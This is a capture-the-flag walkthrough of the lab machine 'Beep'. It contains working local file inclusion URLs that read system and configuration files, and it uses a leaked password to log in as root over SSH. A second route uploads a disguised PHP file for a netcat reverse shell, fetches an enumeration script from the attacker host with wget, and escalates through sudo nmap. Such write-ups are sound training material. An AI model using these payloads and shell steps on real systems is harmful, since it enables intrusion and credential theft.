## Machine Information

![Beep](/assets/images/2020-05-05-22-24-23.png)

Beep has a large list of running services, which can make it a bit challenging to find the
correct entry method. Skills required are basic knowledge of Linux and enumerating ports and services. Skills learned are web-based fuzzing, identifying known exploits and exploiting local file inclusion vulnerabilities.

### Initial Recon

Check for open ports with Nmap:

```text

Lots of ports open, start on normal path looking at port 80.

### Gaining Access

Opening website at http://10.10.10.7 on port 80 automatically redirects to port 443:
![Website](/assets/images/2020-05-11-22-37-57.png)

Login page for something called Elastix. Quick search for default credentials finds this [info](https://dariusfreamon.wordpress.com/2013/11/01/elastix-pbx-default-credentials/). Tried those plus other obvious ones but no luck, so try gobuster to find anything hidden:

/vtigercrm (Status: 301)
```

Having a look at the site: https://10.10.10.7/vtigercrm - We find CRM is version is 5.1.0

Have a look on searchsploit:

```text
root@kali:~/htb/beep# searchsploit vtiger
vTiger CRM 5.1.0 - Local File Inclusion  |  exploits/php/webapps/18770.txt
```

Exploit shows how to use LFI to navigate to sub-directories, use this in browser to get passwd file:

```text
https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```

Press ctrl-u to view source, shows as a proper list instead of jumble.

Copy and paste in to vi, remove all users with no login by doing:

```text
:g/nologin/d
```

Then remove non interesting logins, and cut from cursor to end of line with d$ for each remaining user to give simple list like this:

```text
root
cyrus
asterisk
fanis
```

No obvious way forward with this, so save for possible brute force later and look for another path.

Going back to at Elastix, I find it's prone to LFI exploit:

```text
root@kali:~/htb/beep# searchsploit elastix
-------------------------------------------------------------------------------- 
Exploit Title                                    |  Path
                                                 | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------- 
Elastix 2.2.0 - 'graph.php' Local File Inclusion | exploits/php/webapps/37637.pl
-------------------------------------------------------------------------------- 
```

Exploit shows how to expose the Elastix config, use this in browser:

```text
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
```

This exposes the user **AMPortal**, with password **jEhdlekWmdjE**

The machine is vulnerable to password reuse, so it's possible to logon as root using this password:

```text
root@kali:~/htb/beep# ssh root@10.10.10.7
root@10.10.10.7's password:   <---- enter jEhdlekWmdjE found above
Last login: Tue Jul 16 11:45:47 2019
Welcome to Elastix 
----------------------------------------------------
To access your Elastix System, using a separate workstation (PC/MAC/Linux)
```

### User and Root Flags

Now have an ssh session on to the machine, check who we are logged on as:

```text
whoami
root
```

On as root user, so can get both flags:

```text
cat /home/fanis/user.txt
cat /root/root.txt
```

## Alternative Method

Brief notes of a different way to complete the box.

Log in to https://10.10.10.7/vtigercrm - user **admin**, password **jEhdlekWmdjE**

Navigate to Settings - Company Details

There is a file upload vulnerability where you can upload a jpg but it doesn't properly sanitise. So you can have shell.php.jpg, then use [Tamper Data](https://addons.mozilla.org/en-GB/firefox/addon/tamper-data-for-ff-quantum/) or [Burp](https://portswigger.net/burp) (already installed on Kali) to intercept request and remove double extension. Should then upload as a php file.

Have an nc -lvp 1234 waiting in a terminal and should get a reverse shell.

We are then logged in as user asterisk, and can get user flag from fanis folder.
When checking we see /tmp, is world writeable, so CD to there.

Start web server on Kali:

```text
root@kali:~/htb/beep# service apache2 start
```

Switch back to the box, pull LinEnum to it and run:

```text
wget 10.10.14.10/LinEnum.sh
bash LinEnum.sh
```

Shows what commands can use sudo without password (same as doing sudo -l). Has nmap in list.

Use nmap to escalate to root:

```text
sudo nmap --interactive 
!sh
whoami
root
```

I can now get the user and root flags as above now.
